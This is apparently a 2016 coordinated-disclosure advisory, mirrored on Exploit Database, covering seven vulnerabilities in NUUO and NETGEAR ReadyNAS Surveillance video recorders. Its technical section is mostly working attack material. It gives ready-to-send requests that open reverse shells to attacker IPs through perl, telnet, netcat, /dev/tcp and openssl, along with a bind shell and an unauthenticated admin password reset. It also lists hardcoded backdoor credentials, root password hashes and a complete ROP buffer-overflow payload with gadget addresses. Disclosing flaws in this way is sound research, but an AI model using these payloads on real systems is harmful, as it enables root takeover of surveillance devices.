>> Summary:
NUUO is a vendor of Network Video Recording (NVR) systems for surveillance cameras. These NVR are Linux embedded video recording systems that can manage a number of cameras and are used worldwide by public institutions, banks, SME's, etc. They also provide a software package to NETGEAR that adds network video recording and monitoring capabilities to the well known NETGEAR ReadyNAS Network Attached Storage systems.

The web interface contains a number of critical vulnerabilities that can be abused by unauthenticated attackers. These consist of monitoring backdoors left in the PHP files that are supposed to be used by NUUO's engineers, hardcoded credentials, poorly sanitised input and a buffer overflow which can be abused to achieve code execution on NUUO's devices as root, and on NETGEAR as the admin user.

Although only the NVRmini 2, NVRsolo, Crystal and ReadyNAS Surveillance devices are known to be affected, it is likely that the same code is used in other NUUO devices or even other third party devices (the firmware is littered with references to other devices like NUUO Titan). However this has not been confirmed as it was not possible to access all NUUO and third party devices that might be using the same code.

A special thanks to CERT/CC (https://www.cert.org/) for assistance with disclosing the vulnerabilities to the vendors [1]. Metasploit exploits for #1, #2 and #3 have been released.

>> Technical details:
#1
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5674
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The web inteface contains a hidden file named __debugging_center_utils___.php that improperly sanitises input to the log parameter, which is passed to the PHP system() call (snippet below):

function print_file($file_fullpath_name)
{
    $cmd = "cat " . $file_fullpath_name;
    echo $file_fullpath_name . "\n\n";
    system($cmd);
}

<?php
    if (isset($_GET['log']) && !empty($_GET['log']))
    {
        $file_fullpath_name = constant('LOG_FILE_FOLDER') . '/' . basename($_GET['log']);
        print_file($file_fullpath_name);
    }
    else
    {
        die("unknown command.");
    }
?>

The file can be accessed by an unauthenticated user, and code execution can be achieved with the following proofs of concept:
- ReadyNAS Surveillance:
GET /__debugging_center_utils___.php?log=something%3bperl+-MIO%3a%3aSocket+-e+'$p%3dfork%3bexit,if($p)%3b$c%3dnew+IO%3a%3aSocket%3a%3aINET(PeerAddr,"192.168.1.204%3a9000")%3bSTDIN->fdopen($c,r)%3b$~->fdopen($c,w)%3bsystem$_+while<>%3b'
This will connect a shell back to 192.168.1.204 on port 9000, running as the "admin" user.

- NVRmini 2 and NVRsolo:
GET /__debugging_center_utils___.php?log=something%3btelnet+192.168.1.204+9999+|+bash+|+telnet+192.168.1.204+9998
This will connect two shells to 192.168.1.204, one on port 9999 and another on port 9998. To execute commands, echo into the 9999 shell, and receive the output on the 9998 shell. Commands will run as the root user.

#2
Vulnerability: Improper Input Validation (leading to remote code execution)
CVE-2016-5675
Attack Vector: Remote
Constraints: Requires an administrator account
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- NUUO Crystal, firmware v2.2.1 to v3.2.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The handle_daylightsaving.php page does not sanitise input from the NTPServer parameter correctly and passes it to a PHP system() command (code snippet below):
    else if ($act == 'update')
    {
        $cmd = sprintf("/usr/bin/ntpdate %s", $_GET['NTPServer']);

        $find_str = "time server";

        $sys_msg = system($cmd);
        $pos = strpos($sys_msg, $find_str);

The file can only be accessed by an authenticted user.
- ReadyNAS Surveillance:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3b+whoami+>+/tmp/test
This will create a /tmp/test file with the contents of "admin" (current user).

- NVRmini 2 and NVRsolo:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.1.204+9000+>/tmp/f
Connects a shell to 192.168.1.204, port 9000, running as root.

- Crystal:
GET /handle_daylightsaving.php?act=update&NTPServer=bla%3bbash+-i+>%26+/dev/tcp/192.168.1.204/4444+0>%26
Connects a shell to 192.168.1.204, port 4444, running as root.

#3
Vulnerability: Administrator password reset
CVE-2016-5676
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- NUUO NVRsolo, firmware v1.7.5 to unknown (latest version v3.0.0 requires authentication)
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

On older versions of the firmware and in the ReadyNAS Surveillance application unauthenticated users can call the cgi_system binary from the web interface. This binary performs a number of sensitive system commands, such as the loading of the default configuration that resets the administrator password. It seems that at least versions 2.2.1 and 3.0.0 of the NVRmini 2 and NVRsolo firmware are not affected, so this vulnerability was fixed either on these or earlier versions, but ReadyNAS Surveillance is still vulnerable.

Proof of concept:
GET /cgi-bin/cgi_system?cmd=loaddefconfig

This will reset the admin password of the web interface to admin or password (depending on the firmware version) on all affected devices.

#4
Vulnerability: Information disclosure (system processes, available memory and filesystem status)
CVE-2016-5677
Attack Vector: Remote
Constraints: None, can be exploited by an unauthenticated attacker
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.5 to 3.0.0 (older firmware versions might be affected)
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0
- ReadyNAS Surveillance, v1.1.1 to v1.4.1 (affects both x86 and ARM versions, older versions might be affected)
- Other NUUO products that share the same web interface might be affected

The web interface contains a hidden page (__nvr_status___.php) with a hardcoded username and password that lists the current system processes, available memory and filesystem status. This information can be obtained by an unauthenticated user by performing the following request:
POST /__nvr_status___.php HTTP/1.1
username=nuuoeng&password=qwe23622260&submit=Submit

#5
Vulnerability: Harcoded root password
CVE-2016-5678
Affected products / versions:
- NUUO NVRmini 2, firmware v1.0.0 to 3.0.0
- NUUO NVRsolo, firmware v1.0.0 to 3.0.0

The NVRmini 2 and NVRsolo contain two hardcoded root passwords (one is commented). These passwords have not been cracked, but they are present in the firmware images which are deployed to all NVRmini 2 / NVRsolo devices.

NVRmini 2:
  #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
  root:$1$vd3TecoS$VyBh4/IsumZkqFU.1wfrV.:14461:0:99999:7:::

NVRsolo:
  #root:$1$1b0pmacH$sP7VdEAv01TvOk1JSl2L6/:14495:0:99999:7:::
  root:$1$72ZFYrXC$aDYHvkWBGcRRgCrpSCpiw1:0:0:99999:7:::

#6
Vulnerability: Command injection in cgi_main transfer license command
CVE-2016-5679
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
Affected products / versions:
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)

The transfer_license command has a command injection vulnerability in the "sn" parameter:
cgi_main?cmd=transfer_license&method=offline&sn=";<command>;#

Sample exploit for NVRmini2 (open bind shell on port 4444):
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3bnc+-l+-p+4444+-e+/bin/sh+%26+%23

NETGEAR Surveillance doesn't have netcat, but we can get an openssl reverse shell to 192.168.133.204:4444 instead:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn="%3bmkfifo+/tmp/s%3b+/bin/bash+-i+<+/tmp/s+2>%261+|+openssl+s_client+-quiet+-connect+192.168.133.204%3a4444+>+/tmp/s%3b+rm+/tmp/s%3b%23

> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at "/apps/surveillance/bin/cgi_main" on the ReadyNAS and "/NUUO/bin/cgi_main" on the NVRmini2.

#7
Vulnerability: Stack buffer overflow in cgi_main transfer license command
CVE-2016-5680
Attack Vector: Local / Remote
Constraints: Requires an administrator account if exploited remotely; can be exploited locally by any logged in user
- NUUO NVRmini 2, firmware v1.7.6 to 3.0.0 (older firmware versions might be affected)
- ReadyNAS Surveillance, v1.1.2 (x86 and older versions might be affected)

The "sn" parameter in transfer_license cgi_main method not only has a command injection vulnerability, but also a stack buffer overflow. Below is the pseudocode of the affected function - as it can be seen in the sprintf line, the "sn" parameter is copied directly into a string with a fixed length of 128 characters.

Function 0x20BC9C (NVRmini2 firmware v3.0.0):
      method = getval("method");
      sn = getval("sn");
      (...)
      memset(&command, 0, 128);
      sprintf(&command, "logger -p local0.info -t 'system' \"Activate license: %s\"", sn);
      system(&command);

> For example if the following request is performed:
GET /cgi-bin/cgi_main?cmd=transfer_license&method=offline&sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

> Exploit mitigations and constraints
The table below shows the exploit mitigation technologies for each target:
         NVRmini2   ReadyNAS
NX          Y          Y
RELRO    Partial    Partial
ASLR        N          Y

An additional constraint to keep in mind is that there can be no null bytes in the exploit as the vulnerability is in the sprintf copy operation (which uses a null byte as the string terminator).

> Exploitation in the NVRmini2 (firmware v3.0.0):
This example exploit creates a root bind shell on port 4444 using ROP gadgets to bypass NX. The gadgets were taken from libc-2.15.so, which is always loaded at 4066c000 in firmware 3.0.0.

0x00018ba0 : pop {r3, lr} ; bx lr -> located at 40684BA0 (first gadget, sets up r3 for the next gadget)
0x000f17cc : mov r0, sp ; blx r3 -> located at 4075D7CC (second gadget, set up args for system)
0x00039ffc : system() -> located at 406A5FFC (takes the argument from r0 - pointing to sp - and executes it)
Payload (in the stack) -> %6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26 ("nc -l -p 4444 -e /bin/sh &")

Illustration:
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{first_gadget}aaaaaaaaaaaa{system()_address}{second_gadget}{stack}

Exploit for NVRmini2 firmware v3.0.0 ("sn" parameter value):
sn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%a0%4b%68%40aaaaaaaaaaaa%fc%5f%6a%40%cc%d7%75%40%6e%63%20%2d%6c%20%2d%70%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%73%68%20%26

Other firmware versions will have different gadget addresses. On version 3.0.0 it should work without any modification.

> Exploitation on ReadyNAS Surveillance (version v1.1.2):
To develop this example exploit libcrypto.so.0.9.8 was used. The library is loaded at B6xxx000, where xxx are 4096 possible values for the memory address, as the ReadyNAS has a weak form of ASLR. For this exploit, B6CCE000 was chosen as the target base address (this was chosen randomly from a sample of collected base addresses).

The exploit connects a reverse shell to 192.168.133.204:4444 using OpenSSL. The following ROP gadgets were used:
0x000b3d9c : mov r1, sp ; mov r2, ip ; blx r6 -> located at B6D81D9C (first gadget, gets the location of the stack pointer sp, where the shellcode is located, in r1)

Note that due to the ASLR in the ReadyNAS his exploit has be attempted at few times in order for it to work. Usually less than 20 tries is enough to get the reverse shell to connect back.

> Local exploitation:
This vulnerability can be exploited locally by a logged in user to escalate privileges to root on the NVRmini2 and admin on the ReadyNAS with the following command:
CGI_DEBUG=qwe23622260 cgi_main transfer_license 'method=offline&sn=<PAYLOAD>'
The cgi_main binary is located at "/apps/surveillance/bin/cgi_main" on the ReadyNAS and "/NUUO/bin/cgi_main" on the NVRmini2.

It is likely that all other vulnerabilities in this advisory are exploitable by a local attacker, however this has only been tested for the stack buffer overflow.

>> Fix:
NETGEAR and Nuuo did not respond to CERT/CC coordination efforts (see Timeline below), so no fix is available.
Do not expose any of these devices to the Internet or any networks with unstrusted hosts.

Timeline:
28.02.2016: Disclosure to CERT/CC.
27.04.2016: Requested status update from CERT - they did not receive any response from vendors.
06.06.2016: Requested status update from CERT - still no response from vendors.
            Contacted Nuuo and NETGEAR directly. NETGEAR responded with their "Responsible Disclosure Guidelines", to which I did not agree and requested them to contact CERT if they want to know the details about the vulnerabilities found. No response from Nuuo.
13.06.2016: CERT sent an update saying that NETGEAR has received the details of the vulnerabilities, and they are attempting to contact Nuuo via alternative channels.
07.07.2016: CERT sent an update saying that they have not received any follow up from both Nuuo and NETGEAR, and that they are getting ready for disclosure.
17.07.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
01.08.2016: Sent an email to NETGEAR and Nuuo warning them that disclosure is imminent if CERT doesn't receive a response or status update. No response received.
04.08.2016: Coordinated disclosure with CERT.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Overview

NUUO NVRmini 2, NVRsolo, Crystal, and Netgear ReadyNAS Surveillance products have web management interfaces containing multiple vulnerabilities that can be leveraged to gain complete control of affected devices.

### Description

| NUUO [NVRmini 2](http://www.nuuo.com/ProductNode.php?node=2), [NVRsolo](http://www.nuuo.com/ProductNode.php?stid=0002&node=13), and [Crystal](http://www.nuuo.com/ProductNode.php?stid=0001&node=14), and Netgear [ReadyNAS Surveillance](https://www.netgear.com/business/products/storage/readynas/readynas-surveillance.aspx) are Network Video Recording (NVR) systems with Network Attached Storage (NAS) functionality for managing IP cameras. The web management interfaces of these products are reported to contain multiple vulnerabilities. Note that additional products not identified here may be vulnerable if they use the same web interface; firmware versions earlier than those specified below may also be vulnerable.  [**CWE-20**](https://cwe.mitre.org/data/definitions/20.html)**: Improper Input Validation -** CVE-2016-5674The web management interfaces of affected devices contains a hidden page, \_\_debugging\_center\_utils\_\_.php, that fails to properly validate the log parameter and passes it as input to the PHP system() function. An unauthenticated attacker may make a specially crafted request to execute arbitrary code as root:http://<IP>/\_\_debugging\_center\_utils\_\_\_.php?log=something%3b<payload>CVE-2016-5674 has been confirmed by the researcher to affect the NUUO NVRmini 2 and NVRsolo, versions 1.7.5 to 3.0.0, and the ReadyNAS Surveillance, both x86 and ARM, versions 1.1.1 to 1.4.1. The CVSS score below describes CVE-2016-5674.[**CWE-20**](https://cwe.mitre.org/data/definitions/20.html)**: Improper Input Validation -** CVE-2016-5675The handle\_daylightsaving.php page does not sanitise the NTPServer parameter, which is processed by the PHP system() function. Authenticated attackers may leverage this vulnerability to execute arbitrary code as root:http://<IP>/handle\_daylightsaving.php?act=update&NTPServer=something%3b<payload>CVE-2016-5675 has been confirmed by the researcher to affect:     + NUUO NVRmini 2, versions 1.7.5 to 3.0.0 + NUUO NVRsolo, versions 1.0.0 to 3.0.0 + NUUO Crystal, versions 2.2.1 to 3.2.0 + ReadyNAS Surveillance, both x86 and ARM, versions 1.1.1 to 1.4.1  [**CWE-285**](https://cwe.mitre.org/data/definitions/285.html)**: Improper Authorization -** CVE-2016-5676The cgi\_system binary can be called directly and given commands by anyone capable of accessing the web interface. To reset the administrator account password, for example, an unauthenticated attacker can make a request to:http://<IP>/cgi-bin/cgi\_system?cmd=loaddefconfigCVE-2016-5676 has been confirmed by the researcher to affect NUUO NVRmini 2 and NVRsolo versions 1.7.5 to unknown (versions 2.2.1 and 3.0.0 require authentication), and ReadyNAS Surveillance, both x86 and ARM, versions 1.1.1 to 1.4.1.[**CWE-200**](https://cwe.mitre.org/data/definitions/200.html)**: Information Exposure -** CVE-2016-5677Potentially sensitive system information is exposed by the hidden page, \_\_nvr\_status\_\_\_.php. The page is accessible to all users via page-specific hard-coded credentials, nuuoeng:qwe23622260.CVE-2016-5677 has been confirmed by the researcher to affect:    + NUUO NVRmini 2, versions 1.7.5 to 3.0.0 + NUUO NVRsolo, versions 1.0.0 to 3.0.0 + ReadyNAS Surveillance, both x86 and ARM versions 1.1.1 to v1.4.1  [**CWE-798**](https://cwe.mitre.org/data/definitions/798.html)**: Use of Hard-Coded Credentials -** CVE-2016-5678According to the researcher, NUUO NVRmini 2 and NVRsolo versions 1.0.0 to 3.0.0 contain hard-coded credentials.
